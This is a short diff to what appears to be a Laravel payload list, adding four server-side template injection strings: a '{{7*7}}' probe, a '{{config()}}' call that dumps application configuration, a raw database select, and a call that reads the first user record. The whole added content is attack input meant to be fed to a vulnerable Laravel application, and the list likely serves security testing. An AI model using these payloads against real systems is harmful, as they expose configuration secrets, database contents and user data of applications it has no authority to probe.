@@ -1,2 +1,7 @@
--e # laravel Payload 32
+-e # Laravel Payloads
 # Version: 1.0.15-20260301-Minggu-1621-WIB
+
+{{7*7}}
+{{config()}}
+{{ Illuminate\Support\Facades\DB::select('id') }}
+{{\App\User::first()}}
